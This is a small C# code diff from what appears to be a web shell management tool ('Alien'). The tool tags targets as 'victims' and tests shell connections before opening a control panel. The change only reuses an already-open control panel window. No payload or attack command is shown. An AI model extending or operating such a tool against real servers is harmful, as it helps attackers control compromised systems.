@@ -160,6 +160,13 @@ namespace Alien
             foreach (ListViewItem item in listView1.SelectedItems)
             {
                 clsWeb web = fnGetVictimTag(item);
+                frmControlPanel? frmOpened = clsTool.fnFindForm<frmControlPanel>(web);
+                if (frmOpened != null)
+                {
+                    frmOpened.BringToFront();
+                    continue;
+                }
+
                 if (await web.fnbTestWebConnection() && await web.fnbTestShellConnection())
                 {
                     frmControlPanel f = new frmControlPanel(web);
